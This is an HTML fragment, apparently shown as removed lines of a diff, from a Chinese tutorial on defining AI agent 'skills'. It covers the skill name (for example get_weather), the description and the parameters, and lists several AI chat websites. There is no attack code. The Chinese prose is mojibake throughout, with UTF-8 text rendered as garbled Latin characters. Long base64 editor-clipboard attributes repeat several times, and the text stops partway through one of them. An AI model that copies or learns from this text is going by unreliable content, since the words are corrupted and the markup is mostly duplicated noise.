-<div class="_qe-p_ez4x7_25" data-slate-node="element" data-elm="paragraph"><span data-slate-node="text">ããå½ä½ åè¯Agentâå¸®ææ¥ä¸ä¸åäº¬æå¤©çå¤©æ°âæ¶ï¼Agentçå¤§èä¼åæè¿å¥è¯ï¼ç¶åå³å®è°ç¨ä¸ä¸ªâæ¥è¯¢å¤©æ°âçæè½ãè¿ä¸ªæè½æ¬è´¨ä¸éå¸¸æ¯ä¸ä¸ªAPIæ¥å£æä¸æ®µå½æ°ä»£ç ã</span></div>
-<div class="_qe-p_ez4x7_25" data-slate-node="element" data-elm="paragraph"><span data-slate-node="text"><span data-slate-leaf="true"><strong>Skill = æè¿°ï¼åè¯Agentè¿æ¯ä»ä¹ï¼+ ä»£ç ï¼çæ­£æ§è¡çå¨ä½ï¼</strong></span></span></div>
-<h4 id="4b33ce1a-cdcf-4c8c-8133-0a636aa1b8c5" data-slate-node="element"><span data-slate-node="text">æ ¸å¿ä¸è¦ç´ ï¼å¦ä½å®ä¹ä¸ä¸ªæè½ï¼</span></h4>
-<div class="_qe-p_ez4x7_25" data-slate-node="element" data-elm="paragraph"><span data-slate-node="text">æ è®ºä½¿ç¨åªç§å¼åæ¡æ¶ï¼å¦LangChain, AutoGenç­ï¼ï¼å®ä¹ä¸ä¸ªSkilléå¸¸åªéè¦å³æ³¨ä¸ä¸ªæ ¸å¿è¦ç´ ï¼</span></div>
-<div class="_flat-list-item_b7kvz_1" data-slate-node="element" data-type="flat-list-item"><span class="_marker_b7kvz_9 _ul-marker_b7kvz_15"><span class="_marker_b7kvz_9 _ul-marker_b7kvz_15">â&nbsp;</span></span><span data-slate-node="text"><span data-slate-leaf="true"><strong>æè½åç§°</strong><span data-slate-node="text">ï¼ä¸ä¸ªç®ç­çè±ææ è¯ï¼æ¯å¦<span data-slate-node="text"><span data-slate-leaf="true"><code>get_weather</code><span data-slate-node="text">ã</span></span></span></span></span></span></div>
-<div class="_flat-list-item_b7kvz_1" data-slate-node="element" data-type="flat-list-item"><span class="_marker_b7kvz_9 _ul-marker_b7kvz_15"><span class="_marker_b7kvz_9 _ul-marker_b7kvz_15">â&nbsp;</span></span><span data-slate-node="text"><span data-slate-leaf="true"><strong>æè½æè¿°</strong><span data-slate-node="text">ï¼è¿æ¯æéè¦çä¸ç¯ï¼ä½ éè¦ç¨èªç¶è¯­è¨åè¯Agentè¿ä¸ªæè½æ¯å¹²ä»ä¹çï¼ä»¥åä»ä¹æ¶åè¯¥ç¨å®ã</span></span></span></div>
-<div class="_flat-list-item_b7kvz_1" data-slate-node="element" data-type="flat-list-item" data-slate-fragment="JTVCJTdCJTIydHlwZSUyMiUzQSUyMnBhcmFncmFwaCUyMiUyQyUyMmNoaWxkcmVuJTIyJTNBJTVCJTdCJTIydGV4dCUyMiUzQSUyMiVFNSVCRCU5MyVFNCVCRCVBMCVFNSU5MSU4QSVFOCVBRiU4OUFnZW50JUUyJTgwJTlDJUU1JUI4JUFFJUU2JTg4JTkxJUU2JTlGJUE1JUU0JUI4JTgwJUU0JUI4JThCJUU1JThDJTk3JUU0JUJBJUFDJUU2JTk4JThFJUU1JUE0JUE5JUU3JTlBJTg0JUU1JUE0JUE5JUU2JUIwJTk0JUUyJTgwJTlEJUU2JTk3JUI2JUVGJUJDJThDQWdlbnQlRTclOUElODQlRTUlQTQlQTclRTglODQlOTElRTQlQkMlOUElRTUlODglODYlRTYlOUUlOTAlRTglQkYlOTklRTUlOEYlQTUlRTglQUYlOUQlRUYlQkMlOEMlRTclODQlQjYlRTUlOTAlOEUlRTUlODYlQjMlRTUlQUUlOUElRTglQjAlODMlRTclOTQlQTglRTQlQjglODAlRTQlQjglQUElRTIlODAlOUMlRTYlOUYlQTUlRTglQUYlQTIlRTUlQTQlQTklRTYlQjAlOTQlRTIlODAlOUQlRTclOUElODQlRTYlOEElODAlRTglODMlQkQlRTMlODAlODIlRTglQkYlOTklRTQlQjglQUElRTYlOEElODAlRTglODMlQkQlRTYlOUMlQUMlRTglQjQlQTglRTQlQjglOEElRTklODAlOUElRTUlQjglQjglRTYlOTglQUYlRTQlQjglODAlRTQlQjglQUFBUEklRTYlOEUlQTUlRTUlOEYlQTMlRTYlODglOTYlRTQlQjglODAlRTYlQUUlQjUlRTUlODclQkQlRTYlOTUlQjAlRTQlQkIlQTMlRTclQTAlODElRTMlODAlODIlMjIlN0QlNUQlMkMlMjJpZCUyMiUzQSUyMjViNTdjZjU2LTQ3ZWYtNGFkOS04MjgxLTg3OWJkYTdiZWEzZCUyMiU3RCUyQyU3QiUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJjaGlsZHJlbiUyMiUzQSU1QiU3QiUyMnRleHQlMjIlM0ElMjJTa2lsbCUyMCUzRCUyMCVFNiU4RiU4RiVFOCVCRiVCMCVFRiVCQyU4OCVFNSU5MSU4QSVFOCVBRiU4OUFnZW50JUU4JUJGJTk5JUU2JTk4JUFGJUU0JUJCJTgwJUU0JUI5JTg4JUVGJUJDJTg5JTJCJTIwJUU0JUJCJUEzJUU3JUEwJTgxJUVGJUJDJTg4JUU3JTlDJTlGJUU2JUFEJUEzJUU2JTg5JUE3JUU4JUExJThDJUU3JTlBJTg0JUU1JThBJUE4JUU0JUJEJTlDJUVGJUJDJTg5JTIyJTJDJTIyYm9sZCUyMiUzQXRydWUlN0QlNUQlMkMlMjJpZCUyMiUzQSUyMjg5ZWE4Mjg0LTc1ZjQtNDkwNC1hZGE3LWI1ZjdkNjk4MjUzMCUyMiU3RCUyQyU3QiUyMnR5cGUlMjIlM0ElMjJoZWFkZXIlMjIlMkMlMjJsZXZlbCUyMiUzQSUyMmg0JTIyJTJDJTIyY2hpbGRyZW4lMjIlM0ElNUIlN0IlMjJ0ZXh0JTIyJTNBJTIyJUU2JUEwJUI4JUU1JUJGJTgzJUU0JUI4JTg5JUU4JUE2JTgxJUU3JUI0JUEwJUVGJUJDJTlBJUU1JUE2JTgyJUU0JUJEJTk1JUU1JUFFJTlBJUU0JUI5JTg5JUU0JUI4JTgwJUU0JUI4JUFBJUU2JThBJTgwJUU4JTgzJUJEJUVGJUJDJTlGJTIyJTdEJTVEJTJDJTIyaWQlMjIlM0ElMjI0YjMzY2UxYS1jZGNmLTRjOGMtODEzMy0wYTYzNmFhMWI4YzUlMjIlN0QlMkMlN0IlMjJ0eXBlJTIyJTNBJTIycGFyYWdyYXBoJTIyJTJDJTIyY2hpbGRyZW4lMjIlM0ElNUIlN0IlMjJ0ZXh0JTIyJTNBJTIyJUU2JTk3JUEwJUU4JUFFJUJBJUU0JUJEJUJGJUU3JTk0JUE4JUU1JTkzJUFBJUU3JUE3JThEJUU1JUJDJTgwJUU1JThGJTkxJUU2JUExJTg2JUU2JTlFJUI2JUVGJUJDJTg4JUU1JUE2JTgyTGFuZ0NoYWluJTJDJTIwQXV0b0dlbiVFNyVBRCU4OSVFRiVCQyU4OSVFRiVCQyU4QyVFNSVBRSU5QSVFNCVCOSU4OSVFNCVCOCU4MCVFNCVCOCVBQVNraWxsJUU5JTgwJTlBJUU1JUI4JUI4JUU1JThGJUFBJUU5JTlDJTgwJUU4JUE2JTgxJUU1JTg1JUIzJUU2JUIzJUE4JUU0JUI4JTg5JUU0JUI4JUFBJUU2JUEwJUI4JUU1JUJGJTgzJUU4JUE2JTgxJUU3JUI0JUEwJUVGJUJDJTlBJTIyJTdEJTVEJTJDJTIyaWQlMjIlM0ElMjI1NmEzNTQ5OC1kMzgyLTQ0NzQtODVmMS02Mzg0NDc4YWQ3NWIlMjIlN0QlMkMlN0IlMjJpZCUyMiUzQSUyMjViZ3llN3AzcWxrJTIyJTJDJTIycGFyZW50SWQlMjIlM0ElMjJ5ZDRuZmhqemNwJTIyJTJDJTIyZ3JvdXBJZCUyMiUzQSUyMnlkNG5maGp6Y3AlMjIlMkMlMjJ0eXBlJTIyJTNBJTIyZmxhdC1saXN0LWl0ZW0lMjIlMkMlMjJsaXN0VHlwZSUyMiUzQSUyMnVub3JkZXJlZCUyMiUyQyUyMmluZGV4JTIyJTNBMSUyQyUyMmxldmVsJTIyJTNBMCUyQyUyMmNoaWxkcmVuJTIyJTNBJTVCJTdCJTIydGV4dCUyMiUzQSUyMiVFNiU4QSU4MCVFOCU4MyVCRCVFNSU5MCU4RCVFNyVBNyVCMCUyMiUyQyUyMmJvbGQlMjIlM0F0cnVlJTdEJTJDJTdCJTIydGV4dCUyMiUzQSUyMiVFRiVCQyU5QSVFNCVCOCU4MCVFNCVCOCVBQSVFNyVBRSU4MCVFNyU5RiVBRCVFNyU5QSU4NCVFOCU4QiVCMSVFNiU5NiU4NyVFNiVBMCU4NyVFOCVBRiU4NiVFRiVCQyU4QyVFNiVBRiU5NCVFNSVBNiU4MiUyMiU3RCUyQyU3QiUyMnRleHQlMjIlM0ElMjJnZXRfd2VhdGhlciUyMiUyQyUyMmNvZGUlMjIlM0F0cnVlJTdEJTJDJTdCJTIydGV4dCUyMiUzQSUyMiVFMyU4MCU4MiUyMiU3RCU1RCU3RCUyQyU3QiUyMmlkJTIyJTNBJTIyYzQ4eHVyZnU3aSUyMiUyQyUyMnBhcmVudElkJTIyJTNBJTIyeWQ0bmZoanpjcCUyMiUyQyUyMmdyb3VwSWQlMjIlM0ElMjJ5ZDRuZmhqemNwJTIyJTJDJTIydHlwZSUyMiUzQSUyMmZsYXQtbGlzdC1pdGVtJTIyJTJDJTIybGlzdFR5cGUlMjIlM0ElMjJ1bm9yZGVyZWQlMjIlMkMlMjJpbmRleCUyMiUzQTElMkMlMjJsZXZlbCUyMiUzQTAlMkMlMjJjaGlsZHJlbiUyMiUzQSU1QiU3QiUyMnRleHQlMjIlM0ElMjIlRTYlOEElODAlRTglODMlQkQlRTYlOEYlOEYlRTglQkYlQjAlMjIlMkMlMjJib2xkJTIyJTNBdHJ1ZSU3RCUyQyU3QiUyMnRleHQlMjIlM0ElMjIlRUYlQkMlOUElRTglQkYlOTklRTYlOTglQUYlRTYlOUMlODAlRTklODclOEQlRTglQTYlODElRTclOUElODQlRTQlQjglODAlRTclOEUlQUYlRUYlQkMlODElRTQlQkQlQTAlRTklOUMlODAlRTglQTYlODElRTclOTQlQTglRTglODclQUElRTclODQlQjYlRTglQUYlQUQlRTglQTglODAlRTUlOTElOEElRTglQUYlODlBZ2VudCVFOCVCRiU5OSVFNCVCOCVBQSVFNiU4QSU4MCVFOCU4MyVCRCVFNiU5OCVBRiVFNSVCOSVCMiVFNCVCQiU4MCVFNCVCOSU4OCVFNyU5QSU4NCVFRiVCQyU4QyVFNCVCQiVBNSVFNSU4RiU4QSVFNCVCQiU4MCVFNCVCOSU4OCVFNiU5NyVCNiVFNSU4MCU5OSVFOCVBRiVBNSVFNyU5NCVBOCVFNSVBRSU4MyVFMyU4MCU4MiUyMiU3RCU1RCU3RCUyQyU3QiUyMmlkJTIyJTNBJTIydjV4cGl2dnBmNmklMjIlMkMlMjJwYXJlbnRJZCUyMiUzQSUyMnlkNG5maGp6Y3AlMjIlMkMlMjJncm91cElkJTIyJTNBJTIyeWQ0bmZoanpjcCUyMiUyQyUyMnR5cGUlMjIlM0ElMjJmbGF0LWxpc3QtaXRlbSUyMiUyQyUyMmxpc3RUeXBlJTIyJTNBJTIydW5vcmRlcmVkJTIyJTJDJTIyaW5kZXglMjIlM0ExJTJDJTIybGV2ZWwlMjIlM0EwJTJDJTIyY2hpbGRyZW4lMjIlM0ElNUIlN0IlMjJ0ZXh0JTIyJTNBJTIyJUU1JThGJTgyJUU2JTk1JUIwJUU1JUFFJTlBJUU0JUI5JTg5JTIyJTJDJTIyYm9sZCUyMiUzQXRydWUlN0QlMkMlN0IlMjJ0ZXh0JTIyJTNBJTIyJUVGJUJDJTlBJUU2JTg5JUE3JUU4JUExJThDJUU4JUJGJTk5JUU0JUI4JUFBJUU2JThBJTgwJUU4JTgzJUJEJUU5JTlDJTgwJUU4JUE2JTgxJUU1JTkzJUFBJUU0JUJBJTlCJUU4JUJFJTkzJUU1JTg1JUE1JUU0JUJGJUExJUU2JTgxJUFGJUVGJUJDJTlGJUU2JUFGJTk0JUU1JUE2JTgyJUU2JTlGJUE1JUU4JUFGJUEyJUU1JUE0JUE5JUU2JUIwJTk0JUU5JTlDJTgwJUU4JUE2JTgxJUUyJTgwJTlDJUU1JTlGJThFJUU1JUI4JTgyJUU1JTkwJThEJUUyJTgwJTlEJUU1JTkyJThDJUUyJTgwJTlDJUU2JTk3JUE1JUU2JTlDJTlGJUUyJTgwJTlEJUUzJTgwJTgyJTIyJTdEJTVEJTdEJTVE"><span class="_marker_b7kvz_9 _ul-marker_b7kvz_15"><span class="_marker_b7kvz_9 _ul-marker_b7kvz_15">â&nbsp;</span></span><span data-slate-node="text"><span data-slate-leaf="true"><strong>åæ°å®ä¹</strong><span data-slate-node="text">ï¼æ§è¡è¿ä¸ªæè½éè¦åªäºè¾å¥ä¿¡æ¯ï¼æ¯å¦æ¥è¯¢å¤©æ°éè¦âåå¸åâåâæ¥æâã</span></span></span></div>
-<h1 class="_flat-list-item_b7kvz_1" style="text-align: center" data-slate-node="element" data-type="flat-list-item" data-slate-fragment="JTVCJTdCJTIydHlwZSUyMiUzQSUyMnBhcmFncmFwaCUyMiUyQyUyMmNoaWxkcmVuJTIyJTNBJTVCJTdCJTIydGV4dCUyMiUzQSUyMiVFNSVCRCU5MyVFNCVCRCVBMCVFNSU5MSU4QSVFOCVBRiU4OUFnZW50JUUyJTgwJTlDJUU1JUI4JUFFJUU2JTg4JTkxJUU2JTlGJUE1JUU0JUI4JTgwJUU0JUI4JThCJUU1JThDJTk3JUU0JUJBJUFDJUU2JTk4JThFJUU1JUE0JUE5JUU3JTlBJTg0JUU1JUE0JUE5JUU2JUIwJTk0JUUyJTgwJTlEJUU2JTk3JUI2JUVGJUJDJThDQWdlbnQlRTclOUElODQlRTUlQTQlQTclRTglODQlOTElRTQlQkMlOUElRTUlODglODYlRTYlOUUlOTAlRTglQkYlOTklRTUlOEYlQTUlRTglQUYlOUQlRUYlQkMlOEMlRTclODQlQjYlRTUlOTAlOEUlRTUlODYlQjMlRTUlQUUlOUElRTglQjAlODMlRTclOTQlQTglRTQlQjglODAlRTQlQjglQUElRTIlODAlOUMlRTYlOUYlQTUlRTglQUYlQTIlRTUlQTQlQTklRTYlQjAlOTQlRTIlODAlOUQlRTclOUElODQlRTYlOEElODAlRTglODMlQkQlRTMlODAlODIlRTglQkYlOTklRTQlQjglQUElRTYlOEElODAlRTglODMlQkQlRTYlOUMlQUMlRTglQjQlQTglRTQlQjglOEElRTklODAlOUElRTUlQjglQjglRTYlOTglQUYlRTQlQjglODAlRTQlQjglQUFBUEklRTYlOEUlQTUlRTUlOEYlQTMlRTYlODglOTYlRTQlQjglODAlRTYlQUUlQjUlRTUlODclQkQlRTYlOTUlQjAlRTQlQkIlQTMlRTclQTAlODElRTMlODAlODIlMjIlN0QlNUQlMkMlMjJpZCUyMiUzQSUyMjViNTdjZjU2LTQ3ZWYtNGFkOS04MjgxLTg3OWJkYTdiZWEzZCUyMiU3RCUyQyU3QiUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJjaGlsZHJlbiUyMiUzQSU1QiU3QiUyMnRleHQlMjIlM0ElMjJTa2lsbCUyMCUzRCUyMCVFNiU4RiU4RiVFOCVCRiVCMCVFRiVCQyU4OCVFNSU5MSU4QSVFOCVBRiU4OUFnZW50JUU4JUJGJTk5JUU2JTk4JUFGJUU0JUJCJTgwJUU0JUI5JTg4JUVGJUJDJTg5JTJCJTIwJUU0JUJCJUEzJUU3JUEwJTgxJUVGJUJDJTg4JUU3JTlDJTlGJUU2JUFEJUEzJUU2JTg5JUE3JUU4JUExJThDJUU3JTlBJTg0JUU1JThBJUE4JUU0JUJEJTlDJUVGJUJDJTg5JTIyJTJDJTIyYm9sZCUyMiUzQXRydWUlN0QlNUQlMkMlMjJpZCUyMiUzQSUyMjg5ZWE4Mjg0LTc1ZjQtNDkwNC1hZGE3LWI1ZjdkNjk4MjUzMCUyMiU3RCUyQyU3QiUyMnR5cGUlMjIlM0ElMjJoZWFkZXIlMjIlMkMlMjJsZXZlbCUyMiUzQSUyMmg0JTIyJTJDJTIyY2hpbGRyZW4lMjIlM0ElNUIlN0IlMjJ0ZXh0JTIyJTNBJTIyJUU2JUEwJUI4JUU1JUJGJTgzJUU0JUI4JTg5JUU4JUE2JTgxJUU3JUI0JUEwJUVGJUJDJTlBJUU1JUE2JTgyJUU0JUJEJTk1JUU1JUFFJTlBJUU0JUI5JTg5JUU0JUI4JTgwJUU0JUI4JUFBJUU2JThBJTgwJUU4JTgzJUJEJUVGJUJDJTlGJTIyJTdEJTVEJTJDJTIyaWQlMjIlM0ElMjI0YjMzY2UxYS1jZGNmLTRjOGMtODEzMy0wYTYzNmFhMWI4YzUlMjIlN0QlMkMlN0IlMjJ0eXBlJTIyJTNBJTIycGFyYWdyYXBoJTIyJTJDJTIyY2hpbGRyZW4lMjIlM0ElNUIlN0IlMjJ0ZXh0JTIyJTNBJTIyJUU2JTk3JUEwJUU4JUFFJUJBJUU0JUJEJUJGJUU3JTk0JUE4JUU1JTkzJUFBJUU3JUE3JThEJUU1JUJDJTgwJUU1JThGJTkxJUU2JUExJTg2JUU2JTlFJUI2JUVGJUJDJTg4JUU1JUE2JTgyTGFuZ0NoYWluJTJDJTIwQXV0b0dlbiVFNyVBRCU4OSVFRiVCQyU4OSVFRiVCQyU4QyVFNSVBRSU5QSVFNCVCOSU4OSVFNCVCOCU4MCVFNCVCOCVBQVNraWxsJUU5JTgwJTlBJUU1JUI4JUI4JUU1JThGJUFBJUU5JTlDJTgwJUU4JUE2JTgxJUU1JTg1JUIzJUU2JUIzJUE4JUU0JUI4JTg5JUU0JUI4JUFBJUU2JUEwJUI4JUU1JUJGJTgzJUU4JUE2JTgxJUU3JUI0JUEwJUVGJUJDJTlBJTIyJTdEJTVEJTJDJTIyaWQlMjIlM0ElMjI1NmEzNTQ5OC1kMzgyLTQ0NzQtODVmMS02Mzg0NDc4YWQ3NWIlMjIlN0QlMkMlN0IlMjJpZCUyMiUzQSUyMjViZ3llN3AzcWxrJTIyJTJDJTIycGFyZW50SWQlMjIlM0ElMjJ5ZDRuZmhqemNwJTIyJTJDJTIyZ3JvdXBJZCUyMiUzQSUyMnlkNG5maGp6Y3AlMjIlMkMlMjJ0eXBlJTIyJTNBJTIyZmxhdC1saXN0LWl0ZW0lMjIlMkMlMjJsaXN0VHlwZSUyMiUzQSUyMnVub3JkZXJlZCUyMiUyQyUyMmluZGV4JTIyJTNBMSUyQyUyMmxldmVsJTIyJTNBMCUyQyUyMmNoaWxkcmVuJTIyJTNBJTVCJTdCJTIydGV4dCUyMiUzQSUyMiVFNiU4QSU4MCVFOCU4MyVCRCVFNSU5MCU4RCVFNyVBNyVCMCUyMiUyQyUyMmJvbGQlMjIlM0F0cnVlJTdEJTJDJTdCJTIydGV4dCUyMiUzQSUyMiVFRiVCQyU5QSVFNCVCOCU4MCVFNCVCOCVBQSVFNyVBRSU4MCVFNyU5RiVBRCVFNyU5QSU4NCVFOCU4QiVCMSVFNiU5NiU4NyVFNiVBMCU4NyVFOCVBRiU4NiVFRiVCQyU4QyVFNiVBRiU5NCVFNSVBNiU4MiUyMiU3RCUyQyU3QiUyMnRleHQlMjIlM0ElMjJnZXRfd2VhdGhlciUyMiUyQyUyMmNvZGUlMjIlM0F0cnVlJTdEJTJDJTdCJTIydGV4dCUyMiUzQSUyMiVFMyU4MCU4MiUyMiU3RCU1RCU3RCUyQyU3QiUyMmlkJTIyJTNBJTIyYzQ4eHVyZnU3aSUyMiUyQyUyMnBhcmVudElkJTIyJTNBJTIyeWQ0bmZoanpjcCUyMiUyQyUyMmdyb3VwSWQlMjIlM0ElMjJ5ZDRuZmhqemNwJTIyJTJDJTIydHlwZSUyMiUzQSUyMmZsYXQtbGlzdC1pdGVtJTIyJTJDJTIybGlzdFR5cGUlMjIlM0ElMjJ1bm9yZGVyZWQlMjIlMkMlMjJpbmRleCUyMiUzQTElMkMlMjJsZXZlbCUyMiUzQTAlMkMlMjJjaGlsZHJlbiUyMiUzQSU1QiU3QiUyMnRleHQlMjIlM0ElMjIlRTYlOEElODAlRTglODMlQkQlRTYlOEYlOEYlRTglQkYlQjAlMjIlMkMlMjJib2xkJTIyJTNBdHJ1ZSU3RCUyQyU3QiUyMnRleHQlMjIlM0ElMjIlRUYlQkMlOUElRTglQkYlOTklRTYlOTglQUYlRTYlOUMlODAlRTklODclOEQlRTglQTYlODElRTclOUElODQlRTQlQjglODAlRTclOEUlQUYlRUYlQkMlODElRTQlQkQlQTAlRTklOUMlODAlRTglQTYlODElRTclOTQlQTglRTglODclQUElRTclODQlQjYlRTglQUYlQUQlRTglQTglODAlRTUlOTElOEElRTglQUYlODlBZ2VudCVFOCVCRiU5OSVFNCVCOCVBQSVFNiU4QSU4MCVFOCU4MyVCRCVFNiU5OCVBRiVFNSVCOSVCMiVFNCVCQiU4MCVFNCVCOSU4OCVFNyU5QSU4NCVFRiVCQyU4QyVFNCVCQiVBNSVFNSU4RiU4QSVFNCVCQiU4MCVFNCVCOSU4OCVFNiU5NyVCNiVFNSU4MCU5OSVFOCVBRiVBNSVFNyU5NCVBOCVFNSVBRSU4MyVFMyU4MCU4MiUyMiU3RCU1RCU3RCUyQyU3QiUyMmlkJTIyJTNBJTIydjV4cGl2dnBmNmklMjIlMkMlMjJwYXJlbnRJZCUyMiUzQSUyMnlkNG5maGp6Y3AlMjIlMkMlMjJncm91cElkJTIyJTNBJTIyeWQ0bmZoanpjcCUyMiUyQyUyMnR5cGUlMjIlM0ElMjJmbGF0LWxpc3QtaXRlbSUyMiUyQyUyMmxpc3RUeXBlJTIyJTNBJTIydW5vcmRlcmVkJTIyJTJDJTIyaW5kZXglMjIlM0ExJTJDJTIybGV2ZWwlMjIlM0EwJTJDJTIyY2hpbGRyZW4lMjIlM0ElNUIlN0IlMjJ0ZXh0JTIyJTNBJTIyJUU1JThGJTgyJUU2JTk1JUIwJUU1JUFFJTlBJUU0JUI5JTg5JTIyJTJDJTIyYm9sZCUyMiUzQXRydWUlN0QlMkMlN0IlMjJ0ZXh0JTIyJTNBJTIyJUVGJUJDJTlBJUU2JTg5JUE3JUU4JUExJThDJUU4JUJGJTk5JUU0JUI4JUFBJUU2JThBJTgwJUU4JTgzJUJEJUU5JTlDJTgwJUU4JUE2JTgxJUU1JTkzJUFBJUU0JUJBJTlCJUU4JUJFJTkzJUU1JTg1JUE1JUU0JUJGJUExJUU2JTgxJUFGJUVGJUJDJTlGJUU2JUFGJTk0JUU1JUE2JTgyJUU2JTlGJUE1JUU4JUFGJUEyJUU1JUE0JUE5JUU2JUIwJTk0JUU5JTlDJTgwJUU4JUE2JTgxJUUyJTgwJTlDJUU1JTlGJThFJUU1JUI4JTgyJUU1JTkwJThEJUUyJTgwJTlEJUU1JTkyJThDJUUyJTgwJTlDJUU2JTk3JUE1JUU2JTlDJTlGJUUyJTgwJTlEJUUzJTgwJTgyJTIyJTdEJTVEJTdEJTVE">ç¼åèªå·±çAgent Skill</h1>
-<h2>åç½®æ¡ä»¶</h2>
-<p>AIç½ç«</p>
-<ul>
-<li>kimiï¼<a href="https://www.kimi.com/" target="_blank" rel="noopener nofollow">https://www.kimi.com/</a></li>
-<li>deepseekï¼<a href="https://www.deepseek.com/" target="_blank" rel="noopener nofollow">https://www.deepseek.com/</a></li>
-<li>chatgptï¼<a href="https://chat.openai.com/" target="_blank" rel="noopener nofollow">https://chat.openai.com/</a></li>
-<li>åé®ï¼<a href="https://www.qianwen.com/" target="_blank" rel="noopener nofollow">https://www.qianwen.com/</a></li>
-<li>grokï¼<a href="https://grok.com/" target="_blank" rel="noopener nofollow">https://grok.com/</a></li>
-<li>...</li>
-</ul>
-<p>agentskillç½ç«ï¼<a href="https://agentskills.io/" target="_blank" rel="noopener nofollow">ç¹æç´è¾¾</a></p>
-<h2>æ¼ç¤º</h2>
-<div class="_flat-list-item_b7kvz_1" data-slate-node="element" data-type="flat-list-item" data-slate-fragment="JTVCJTdCJTIydHlwZSUyMiUzQSUyMnBhcmFncmFwaCUyMiUyQyUyMmNoaWxkcmVuJTIyJTNBJTVCJTdCJTIydGV4dCUyMiUzQSUyMiVFNSVCRCU5MyVFNCVCRCVBMCVFNSU5MSU4QSVFOCVBRiU4OUFnZW50JUUyJTgwJTlDJUU1JUI4JUFFJUU2JTg4JTkxJUU2JTlGJUE1JUU0JUI4JTgwJUU0JUI4JThCJUU1JThDJTk3JUU0JUJBJUFDJUU2JTk4JThFJUU1JUE0JUE5JUU3JTlBJTg0JUU1JUE0JUE5JUU2JUIwJTk0JUUyJTgwJTlEJUU2JTk3JUI2JUVGJUJDJThDQWdlbnQlRTclOUElODQlRTUlQTQlQTclRTglODQlOTElRTQlQkMlOUElRTUlODglODYlRTYlOUUlOTAlRTglQkYlOTklRTUlOEYlQTUlRTglQUYlOUQlRUYlQkMlOEMlRTclODQlQjYlRTUlOTAlOEUlRTUlODYlQjMlRTUlQUUlOUElRTglQjAlODMlRTclOTQlQTglRTQlQjglODAlRTQlQjglQUElRTIlODAlOUMlRTYlOUYlQTUlRTglQUYlQTIlRTUlQTQlQTklRTYlQjAlOTQlRTIlODAlOUQlRTclOUElODQlRTYlOEElODAlRTglODMlQkQlRTMlODAlODIlRTglQkYlOTklRTQlQjglQUElRTYlOEElODAlRTglODMlQkQlRTYlOUMlQUMlRTglQjQlQTglRTQlQjglOEElRTklODAlOUElRTUlQjglQjglRTYlOTglQUYlRTQlQjglODAlRTQlQjglQUFBUEklRTYlOEUlQTUlRTUlOEYlQTMlRTYlODglOTYlRTQlQjglODAlRTYlQUUlQjUlRTUlODclQkQlRTYlOTUlQjAlRTQlQkIlQTMlRTclQTAlODElRTMlODAlODIlMjIlN0QlNUQlMkMlMjJpZCUyMiUzQSUyMjViNTdjZjU2LTQ3ZWYtNGFkOS04MjgxLTg3OWJkYTdiZWEzZCUyMiU3RCUyQyU3QiUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJjaGlsZHJlbiUyMiUzQSU1QiU3QiUyMnRleHQlMjIlM0ElMjJTa2lsbCUyMCUzRCUyMCVFNiU4RiU4RiVFOCVCRiVCMCVFRiVCQyU4OCVFNSU5MSU4QSVFOCVBRiU4OUFnZW50JUU4JUJGJTk5JUU2JTk4JUFGJUU0JUJCJTgwJUU0JUI5JTg4JUVGJUJDJTg5JTJCJTIwJUU0JUJCJUEzJUU3JUEwJTgxJUVGJUJDJTg4JUU3JTlDJTlGJUU2JUFEJUEzJUU2JTg5JUE3JUU4JUExJThDJUU3JTlBJTg0JUU1JThBJUE4JUU0JUJEJTlDJUVGJUJDJTg5JTIyJTJDJTIyYm9sZCUyMiUzQXRydWUlN0QlNUQlMkMlMjJpZCUyMiUzQSUyMjg5ZWE4Mjg0LTc1ZjQtNDkwNC1hZGE3LWI1ZjdkNjk4MjUzMCUyMiU3RCUyQyU3QiUyMnR5cGUlMjIlM0ElMjJoZWFkZXIlMjIlMkMlMjJsZXZlbCUyMiUzQSUyMmg0JTIyJTJDJTIyY2hpbGRyZW4lMjIlM0ElNUIlN0IlMjJ0ZXh0JTIyJTNBJTIyJUU2JUEwJUI4JUU1JUJGJTgzJUU0JUI4JTg5JUU4JUE2JTgxJUU3JUI0JUEwJUVGJUJDJTlBJUU1JUE2JTgyJUU0JUJEJTk1JUU1JUFFJTlBJUU0JUI5JTg5JUU0JUI4JTgwJUU0JUI4JUFBJUU2JThBJTgwJUU4JTgzJUJEJUVGJUJDJTlGJTIyJTdEJTVEJTJDJTIyaWQlMjIlM0ElMjI0YjMzY2UxYS1jZGNmLTRjOGMtODEzMy0wYTYzNmFhMWI4YzUlMjIlN0QlMkMlN0IlMjJ0eXBlJTIyJTNBJTIycGFyYWdyYXBoJTIyJTJDJTIyY2hpbGRyZW4lMjIlM0ElNUIlN0IlMjJ0ZXh0JTIyJTNBJTIyJUU2JTk3JUEwJUU4JUFFJUJBJUU0JUJEJUJGJUU3JTk0JUE4JUU1JTkzJUFBJUU3JUE3JThEJUU1JUJDJTgwJUU1JThGJTkxJUU2JUExJTg2JUU2JTlFJUI2JUVGJUJDJTg4JUU1JUE2JTgyTGFuZ0NoYWluJTJDJTIwQXV0b0dlbiVFNyVBRCU4OSVFRiVCQyU4OSVFRiVCQyU4QyVFNSVBRSU5QSVFNCVCOSU4OSVFNCVCOCU4MCVFNCVCOCVBQVNraWxsJUU5JTgwJTlBJUU1JUI4JUI4JUU1JThGJUFBJUU5JTlDJTgwJUU4JUE2JTgxJUU1JTg1JUIzJUU2JUIzJUE4JUU0JUI4JTg5JUU0JUI4JUFBJUU2JUEwJUI4JUU1JUJGJTgzJUU4JUE2JTgxJUU3JUI0JUEwJUVGJUJDJTlBJTIyJTdEJTVEJTJDJTIyaWQlMjIlM0ElMjI1NmEzNTQ5OC1kMzgyLTQ0NzQtODVmMS02Mzg0NDc4YWQ3NWIlMjIlN0QlMkMlN0IlMjJpZCUyMiUzQSUyMjViZ3llN3AzcWxrJTIyJTJDJTIycGFyZW50SWQlMjIlM0ElMjJ5ZDRuZmhqemNwJTIyJTJDJTIyZ3JvdXBJZCUyMiUzQSUyMnlkNG5maGp6Y3AlMjIlMkMlMjJ0eXBlJTIyJTNBJTIyZmxhdC1saXN0LWl0ZW0lMjIlMkMlMjJsaXN0VHlwZSUyMiUzQSUyMnVub3JkZXJlZCUyMiUyQyUyMmluZGV4JTIyJTNBMSUyQyUyMmxldmVsJTIyJTNBMCUyQyUyMmNoaWxkcmVuJTIyJTNBJTVCJTdCJTIydGV4dCUyMiUzQSUyMiVFNiU4QSU4MCVF